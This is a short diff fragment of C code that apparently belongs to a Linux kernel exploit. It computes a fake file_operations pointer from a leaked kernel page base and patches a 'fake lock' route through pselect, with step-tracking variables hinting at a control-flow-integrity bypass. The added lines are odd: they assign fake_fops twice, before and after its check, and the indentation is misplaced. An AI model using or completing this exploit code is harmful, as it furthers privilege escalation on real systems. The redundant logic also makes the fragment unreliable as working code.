@@ -90,11 +90,20 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 }
 
 void do_pselect_fake_lock_route(void) {
+  fake_fops = page_base + FOPS_OFF;
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
     pr_error("fops route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
              page_base, fake_lock, fake_fops);
+    return;
+  }
+    /* S25FE: set global fake_fops before direct overwrite */
+  fake_fops = page_base + FOPS_OFF;
+  if (!fake_fops) {
+    cfi_last_step = 30;
+    cfi_last_errno = 0;
+    pr_error("fops route fake_fops computation failed\n");
     return;
   }
 
